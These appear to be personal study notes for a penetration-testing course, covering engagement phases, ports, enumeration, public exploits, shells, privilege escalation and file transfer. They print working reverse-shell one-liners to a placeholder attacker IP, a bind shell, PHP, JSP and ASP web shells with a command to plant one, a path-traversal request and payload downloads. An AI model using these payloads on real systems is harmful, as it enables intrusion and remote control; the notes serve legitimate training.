Stage   Description
1. Pre-Engagement   The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions.
2. Information Gathering  Once the pre-engagement activities are complete, we investigate the company's existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions.
3. Vulnerability Assessment   With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions.
4. Exploitation   Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities.
5. Post-Exploitation  Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations).
6. Lateral Movement   If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered.
7. Proof-of-Concept   We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.
8. Post-Engagement  Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.




## CPTS-exam

We will interact with more than `150 targets` during the Penetration Tester Job Role Path and perform nine simulated mini penetration tests, giving us plenty of opportunities to work on and practice this topic. Furthermore, operating system-specific modules should be considered from the pillaging point of view because much of what is shown in those modules can be used for information retrieval or privilege escalation on the target systems.



So pillaging Another essential step is Pillaging. After hitting the Post-Exploitation stage, pillaging is performed to collect sensitive information locally on the already exploited host, such as employee names, customer data, and much more. However, this information gathering only occurs after exploiting the target host and gaining access to it.



##  mindset

Other than the fact that this port is open, Nmap did not show us anything else. We must now ask ourselves what conclusions can be drawn from this result. Therefore, it does not matter which question we start with to make our conclusions. However, it is essential to ask `precise questions` and remember what we `know` and `do not know`. At this point, we must first ask ourselves what we `see` and what we actually `have`, because what we see is not the same as what we have:

- a `TCP` port `2121`. - `TCP` already means that this service is `connection-oriented`.
    
- Is this a `standard` port? - `No`, because these are between `0-1023`, aka well-known or [system ports](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
    
- Are there any numbers in this `port number` that look `familiar`? - `Yes`, `TCP` port `21` (`FTP`). From our experience, we will get to know many standard ports and their services, which administrators often try to disguise, but often use "easy to remember" alternatives.



Based on our guess, we can try to connect to the service using `Netcat` or an `FTP` client and try to establish a connection to confirm or disprove our guess.

While connecting to the service, we noticed that the connection took longer than usual (about 15 seconds). There are some services whose connection speed, or response time, can be configured. Now that we know that an FTP server is running on this port, we can deduce the origin of our "failed" scan. We could confirm this again by specifying the minimum `probe round trip time` (`--min-rtt-timeout`) in Nmap to 15 or 20 seconds and rerunning the scan.


## Pivoting

In most cases, the system we use will not have the tools to enumerate the internal network efficiently. Some techniques allow us to use the exploited host as a proxy and perform all the scans from our attack machine or VM. In doing so, the exploited system represents and routes all our network requests sent from our attack machine to the internal network and its network components.

In this way, we make sure that non-routable networks (and therefore publicly unreachable) can still be reached. This allows us to scan them for vulnerabilities and penetrate deeper into the network. This process is also known as `Pivoting` or `Tunneling`.

An elementary example could be that we have a printer at home that is not accessible from the Internet, but we can send print jobs from our home network. If one of the hosts on our home network has been compromised, it could be leveraged to send these jobs to the printer. Though this is a simple (and unlikely) example, it illustrates the goal of `pivoting`, which is to access inaccessible systems via an intermediary system.


## Evasive Testing

Also, at this stage, we should consider whether evasive testing is part of the assessment scope. There are different procedures for each tactic, which support us in disguising these requests to not trigger an internal alarm among the administrators and the blue team.

There are many ways to protect against lateral movement, including network (micro) `segmentation`, `threat monitoring`, `IPS`/`IDS`, `EDR`, etc. To bypass these efficiently, we need to understand how they work and what they respond to. Then we can adapt and apply methods and strategies that help avoid detection.

# Post-Engagement

Much like there is considerable legwork before an engagement officially starts (when testing begins), we must perform many activities (many of them contractually binding) after our scans, exploitation, lateral movement, and post-exploitation activities are complete. No two engagements are the same, so these activities may differ slightly but generally must be performed to close out an engagement fully.

![[0-PT-Process.png]]

---

## Cleanup

Once testing is complete, we should perform any necessary cleanup, such as deleting tools/scripts uploaded to target systems, reverting any (minor) configuration changes we may have made, etc. We should have detailed notes of all of our activities, making any cleanup activities easy and efficient. If we cannot access a system where an artifact needs to be deleted, or another change reverted, we should alert the client and list these issues in the report appendices. Even if we can remove any uploaded files and revert changes (such as adding a local admin account), we should document these changes in our report appendices in case the client receives alerts that they need to follow up on and confirm that the activity in question was part of our sanctioned testing.

---

## Documentation and Reporting

Before completing the assessment and disconnecting from the client's internal network or sending "stop" notification emails to signal the end of testing (meaning no more interaction with the client's hosts), we must make sure to have adequate documentation for all findings that we plan to include in our report. This includes command output, screenshots, a listing of affected hosts, and anything else specific to the client environment or finding. We should also make sure that we have retrieved all scan and log output if the client hosted a VM in their infrastructure for an internal penetration test and any other data that may be included as part of the report or as supplementary documentation. We should not keep any Personal Identifiable Information (PII), potentially incriminating info, or other sensitive data we came across throughout testing.

We should already have a detailed list of the findings we will include in the report and all necessary details to tailor the findings to the client's environment. Our report deliverable (which is covered in detail in the [Documentation & Reporting](https://academy.hackthebox.com/module/details/162) module) should consist of the following:

- An attack chain (in the event of full internal compromise or external to internal access) detailing steps taken to achieve compromise
- A strong executive summary that a non-technical audience can understand
- Detailed findings specific to the client's environment that include a risk rating, finding impact, remediation recommendations, and high-quality external references related to the issue
- Adequate steps to reproduce each finding so the team responsible for remediation can understand and test the issue while putting fixes in place
- Near, medium, and long-term recommendations specific to the environment
- Appendices which include information such as the target scope, OSINT data (if relevant to the engagement), password cracking analysis (if relevant), discovered ports/services, compromised hosts, compromised accounts, files transferred to client-owned systems, any account creation/system modifications, an Active Directory security analysis (if relevant), relevant scan data/supplementary documentation, and any other information necessary to explain a specific finding or recommendation further

At this stage, we will create a draft report that is the first deliverable our client will receive. From here, they will be able to comment on the report and ask for any necessary clarification/modifications.

---

## Report Review Meeting

Once the draft report is delivered, and the client has had a chance to distribute it internally and review it in-depth, it is customary to hold a report review meeting to walk through the assessment results. The report review meeting typically includes the same folks from the client and the firm performing the assessment. Depending on the types of findings, the client may bring in additional technical subject matter experts if the finding is related to a system or application they are responsible for. Typically we will not read the entire report word for word but walk through each finding briefly and give an explanation from our own perspective/experience. The client will have the opportunity to ask questions about anything in the report, ask for clarifications, or point out issues that need to be corrected. Often the client will come with a list of questions about specific findings and will not want to cover every finding in detail (such as low-risk ones).

---

## Deliverable Acceptance

The Scope of Work should clearly define the acceptance of any project deliverables. In penetration test assessments, generally, we deliver a report marked `DRAFT` and give the client a chance to review and comment. Once the client has submitted feedback (i.e., management responses, requests for clarification/changes, additional evidence, etc.) either by email or (ideally) during a report review meeting, we can issue them a new version of the report marked `FINAL`. Some audit firms that clients may be beholden to will not accept a penetration test report with a `DRAFT` designation. Other companies will not care, but keeping a uniform approach across all customers is best.

---

## Post-Remediation Testing

Most engagements include post-remediation testing as part of the project's total cost. In this phase, we will review any documentation provided by the client showing evidence of remediation or just a list of remediated findings. We will need to reaccess the target environment and test each issue to ensure it was appropriately remediated. We will issue a post-remediation report that clearly shows the state of the environment before and after post-remediation testing. For example, we may include a table such as:

|#|Finding Severity|Finding Title|Status|
|---|---|---|---|
|1|High|SQL Injection|Remediated|
|2|High|Broken Authentication|Remediated|
|3|High|Unrestricted File Upload|Remediated|
|4|High|Inadequate Web and Egress Filtering|Not Remediated|
|5|Medium|SMB Signing Not Enabled|Not Remediated|
|6|Low|Directory Listing Enabled|Not Remediated|

For each finding (where possible), we will want to show evidence that the issue is no longer present in the environment through scan output or proof that the original exploitation techniques fail.

---

## Role of the Pentester in Remediation

Since a penetration test is essentially an audit, we must remain impartial third parties and not perform remediation on our findings (such as fixing code, patching systems, or making configuration changes in Active Directory). We must maintain a degree of independence and can serve as trusted advisors by giving general remediation advice on how a specific issue could be fixed or be available to explain further/demonstrate a finding so the team assigned to remediate it has a better understanding. We should not be implementing changes ourselves or even giving precise remediation advice (i.e., for SQL Injection, we may say "sanitize user input" but not give the client a rewritten piece of code). This will help maintain the assessment's integrity and not introduce any potential conflict of interest into the process.

---

## Data Retention

After a penetration test concludes, we will have a considerable amount of client-specific data such as scan results, log output, credentials, screenshots, and more. Data retention and destruction requirements may differ from country to country and firm to firm, and procedures surrounding each should be outlined clearly in the contract language of the Scope of Work and the Rules of Engagement. Per [Penetration Testing Guidance](https://www.pcisecuritystandards.org/documents/Penetration_Testing_Guidance_March_2015.pdf) from the PCI Data Security Standard (PCI DSS):

"While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that the tester retain such evidence (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement."

We should retain evidence for some time after the penetration test in case questions arise about specific findings or to assist with retesting "closed" findings after the client has performed remediation activities. Any data retained after the assessment should be stored in a secure location owned and controlled by the firm and encrypted at rest. All data should be wiped from tester systems at the conclusion of an assessment. A new virtual machine specific to the client in question should be created for any post-remediation testing or investigation of findings related to client inquiries.

---

## Close Out

Once we have delivered the final report, assisted the client with questions regarding remediation, and performed post-remediation testing/issued a new report, we can finally close the project. At this stage, we should ensure that any systems used to connect to the client's systems or process data have been wiped or destroyed and that any artifacts leftover from the engagement are stored securely (encrypted) per our firm's policy and per contractual obligations to our client. The final steps would be invoicing the client and collecting payment for services rendered. Finally, it is always good to follow up with a post-assessment client satisfaction survey so the team and management, in particular, can see what went well during the engagement and what could be improved upon from a company process standpoint and the individual consultant assigned to the project. Discussions for follow-on work may arise in the weeks or months after if the client was pleased with our work and day-to-day interactions.

As we continually grow our technical skillset, we should always look for ways to improve our soft skills and become more well-rounded professional consultants. In the end, the `client will usually remember interactions` during the assessment, communication, and how they were treated/valued by the firm they engage, `not the fancy exploit chain the pentester pulled off to pwn their systems`. Take this time to self-reflect and work on continuous improvement in all aspects of your role as a professional penetration tester.


# Connecting Using VPN

---
#vpn #openvpn


A [virtual private network (VPN)](https://en.wikipedia.org/wiki/Virtual_private_network) allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company's corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.![[vpn.png]]


We can use a VPN service such as `NordVPN` or `Private Internet Access` and connect to a VPN server in another part of our country or another region of the world to obscure our browsing traffic or disguise our public IP address. This can provide us with some level of security and privacy. Still, since we are connecting to a company's server, there is always the chance that data is being logged or the VPN service is not following security best practices or the security features that they advertise. Using a VPN service comes with the risk that the provider is not doing what they are saying and are logging all data. Usage of a VPN service **does not** guarantee anonymity or privacy but is useful for bypassing certain network/firewall restrictions or when connected to a possible hostile network (i.e., a public airport wireless network). A VPN service should never be used with the thought that it will protect us from the consequences of performing nefarious activities.

## What is a Port?

A [port](https://en.wikipedia.org/wiki/Port_\(computer_networking\)) can be thought of as a window or door on a house (the house being a remote system), if a window or door is left open or not locked correctly, we can often gain unauthorized access to a home. This is similar in computing. Ports are virtual points where network connections begin and end. They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH traffic flows to a different port than web requests to access a website even though the access requests are sent over the same network connection).

Each port is assigned a number, and many are standardized across all network-connected devices (though a service can be configured to run on a non-standard port). For example, `HTTP` messages (website traffic) typically go to port `80`, while `HTTPS` messages go to port `443` unless configured otherwise. We will encounter web applications running on non-standard ports but typically find them on ports 80 and 443. Port numbers allow us to access specific services or applications running on target devices. At a very high level, ports help computers understand how to handle the various types of data they receive.

There are two categories of ports, [Transmission Control Protocol (TCP)](https://en.wikipedia.org/wiki/Transmission_Control_Protocol), and [User Datagram Protocol (UDP)](https://en.wikipedia.org/wiki/User_Datagram_Protocol).  
`TCP` is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.  
`UDP` utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. `UDP` is useful when error correction/checking is either not needed or is handled by the application itself. `UDP` is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with `TCP` and can significantly affect a real-time system. There are `65,535` `TCP` ports and `65,535` different `UDP` ports, each denoted by a number. Some of the most well-known `TCP` and `UDP` ports are listed below:

|Port(s)|Protocol|
|---|---|
|`20`/`21` (TCP)|`FTP`|
|`22` (TCP)|`SSH`|
|`23` (TCP)|`Telnet`|
|`25` (TCP)|`SMTP`|
|`80` (TCP)|`HTTP`|
|`161` (TCP/UDP)|`SNMP`|
|`389` (TCP/UDP)|`LDAP`|
|`443` (TCP)|`SSL`/`TLS` (`HTTPS`)|
|`445` (TCP)|`SMB`|
|`3389` (TCP)|`RDP`|

As information security professionals, we must be able to quickly recall large amounts of information on a wide variety of topics. It is essential for us, especially as pentesters, to have a firm grasp of many `TCP` and `UDP` ports and be able to recognize them from just their number quickly (i.e., know that port `21` is `FTP`, port `80` is `HTTP`, port `88` is `Kerberos`) without having to look it up. This will come with practice and repetition and eventually become second nature as we attack more boxes, labs, and real-world networks and help us work more efficiently and better prioritize our enumeration efforts and attacks.

Guides such as [this](https://www.stationx.net/common-ports-cheat-sheet/) and [this](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf) are great resources for learning standard and less common TCP and UDP ports. Challenge yourself to memorize as many of these as possible and do some research about each of the protocols listed in the table above. This is a great [reference](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) on the top 1,000 `TCP` and `UDP` ports from `nmap` along with the top 100 services scanned by `nmap`.


## What is a Web Server

A web server is an application that runs on the back-end server, which handles all of the `HTTP` traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser. Web servers usually run on TCP ports `80` or `443`, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses:

Many types of vulnerabilities can affect web applications. We will often hear about/see references to the [OWASP Top 10](https://owasp.org/www-project-top-ten/). This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application


|Number|Category|Description|
|---|---|---|
|1.|[Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)|Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.|
|2.|[Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)|Failures related to cryptography which often leads to sensitive data exposure or system compromise.|
|3.|[Injection](https://owasp.org/Top10/A03_2021-Injection/)|User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.|
|4.|[Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)|These issues happen when the application is not designed with security in mind.|
|5.|[Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)|Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.|
|6.|[Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)|Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.|
|7.|[Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)|Authentication-related attacks that target user's identity, authentication, and session management.|
|8.|[Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)|Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).|
|9.|[Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)|This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..|
|10.|[Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)|SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).|

It is essential to become familiar with each of these categories and the various vulnerabilities that fit each.

#Service #snmp #snmpwalk #onesixtyone
#### SNMP

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of `public` and `private` are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

Service Scanning

```bash
snmpwalk -v 2c -c public <ip> 
snmpwalk -v 2c -c private  <ip>
onesixtyone -c /home/nullbyte/SecLists/snmp_dict.txt 10.129.42.254
```

A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool

# Web Enumeration

#DirectoryEnumeration #fuzz #webcontent #webapp


When performing service scanning, we will often run into web servers running on ports 80 and 443. Webservers host web applications (sometimes more than 1) which often provide a considerable attack surface and a very high-value target during a penetration test. Proper web enumeration is critical, especially when an organization is not exposing many services or those services are appropriately patched.


## Gobuster

After discovering a web application, it is always worth checking to see if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use a tool such as [ffuf](https://github.com/ffuf/ffuf) or [GoBuster](https://github.com/OJ/gobuster) to perform this directory enumeration. Sometimes we will find hidden functionality or pages/directories exposing sensitive data that can be leveraged to access the web application or even remote code execution on the web server itself.


GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. The tool has additional functionality, such as enumeration of public AWS S3 buckets. For this module's purposes, we are interested in the directory (and file) brute-forcing modes specified with the switch `dir`. Let us run a simple scan using the `dirb` `common.txt` wordlist.

nb: Seclist can be installed with **`sudo apt install seclists -y`**

gobuster dir -u IP -w /home/nullbyte/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Public Exploits



Once we identify the services running on ports identified from our `Nmap` scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like `SSH` or `ftp`.

// Finding Public Exploits

**Many tools** can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to **Google** for the application name with `exploit` to see if we get any results:


![[google_smb.jpg]]



A well-known tool for this purpose is **`searchsploit`**, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command


Example of the HTB was to find a particular **SimpleBackup** file read in a **`Wordpress`** plugin and the exploit worked with payload /flag.txt

https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/


```bash
└─$ curl 'http://94.237.55.96:40307/wp-admin/tools.php?page=backup_manager&download_backup_file=../../../../../flag.txt'     
HTB{my_f1r57_h4ck}

# Types of Shells


Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., `Bash` or `PowerShell`, so we can thoroughly investigate the remote system for our next move.

One way to connect to a compromised system is through network protocols, like `SSH` for Linux or `WinRM` for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.

The other method of accessing a compromised host for control and remote code execution is through shells.  
As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.

|Type of Shell|Method of Communication|
|---|---|
|`Reverse Shell`|Connects back to our system and gives us control through a reverse connection.|
|`Bind Shell`|Waits for us to connect to it and gives us control once we do.|
|`Web Shell`|Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.|

Let us dive more deeply into each of the above shells and walk through examples of each.

## Reverse Shell

A `Reverse Shell` is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a `netcat` listener on our machine that listens on a specific port, say port `1234`. With this listener in place, we can execute a `reverse shell command` that connects the remote systems shell, i.e., `Bash` or `PowerShell` to our `netcat` listener, which gives us a reverse connection over the remote system.

### Possible payloads

#reverseshell #payloadrs #shell  


simple bash:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

mkfifo bash:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

mkfifo bind shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```


powershell:

```bash

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

```


spanw in extra env : 

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```bash
www-data@remotehost$ ^Z

c0derpwner@htb[/htb]$ stty raw -echo
c0derpwner@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$  export TERM=xterm
```


#### Writing a Web Shell

First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```


#### Uploading a Web Shell

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

| Web Server | Default Webroot        |     |
| ---------- | ---------------------- | --- |
| `Apache`   | /var/www/html/         |     |
| `Nginx`    | /usr/local/nginx/html/ |     |
| `IIS`      | c:\inetpub\wwwroot\|   |     |
| `XAMPP`    | C:\xampp\htdocs\|      |     |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Another option is to use `cURL`:

Types of Shells

```bash
c0derpwner@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a `Python` script to automate this process and give us a semi-interactive web shell right within our terminal.

# Privilege Escalation

---

Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the `root` user on `Linux` or the `administrator`/`SYSTEM` user on `Windows`. Let us walk through some common methods of escalating our privileges.




https://gtfobins.github.io/


## Enumeration Scripts

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.


## Kernel Exploits

Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.

For example, the above script showed us the Linux version to be `3.9.0-73-generic`. If we Google exploits for this version or use `searchsploit`, we would find a `CVE-2016-5195`, otherwise known as `DirtyCow`. We can search for and download the [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) exploit and run it on the server to gain root access.

The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation. We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.

---

## Vulnerable Software

Another thing we should look for is installed software. For example, we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.

---

## User Privileges

Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:

1. Sudo
2. SUID
3. Windows Token Privileges

The `sudo` command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like `tcpdump`' or allow the user to access certain root-only directories. We can check what `sudo` privileges we have with the **`sudo -l`** command:


```bash
/home/user2$ sudo -l  
Matching Defaults entries for user1 on ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User user1 may run the following commands on ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:  
   (user2 : user2) NOPASSWD: /bin/bash  
user1@ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:/home/user2$
```
as you can see there's sudo user2 bash possibility to read flag on his `/home/user2`

# Transferring Files



During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.


## Wget

There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

Transferring Files

```bash
c0derpwner@htb[/htb]$ cd /tmp
c0derpwner@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

Transferring Files

```bash
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:

Transferring Files

```bash
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Note that we used the `-o` flag to specify the output file name.

---

## Using SCP 

Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

Transferring Files

```bash
c0derpwner@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.

---

## Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

Transferring Files

```bash
c0derpwner@htb[/htb]$ base64 shell -w0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

Transferring Files

```bash
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---

## Validating File Transfers

To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:

Transferring Files

```bash
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:

---



# Nmap Enumeration


Nmap offers many different scanning techniques, making different types of connections and using differently structured packets to send. Here we can see all the scanning techniques Nmap offers:


If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects that the port is `open`. 
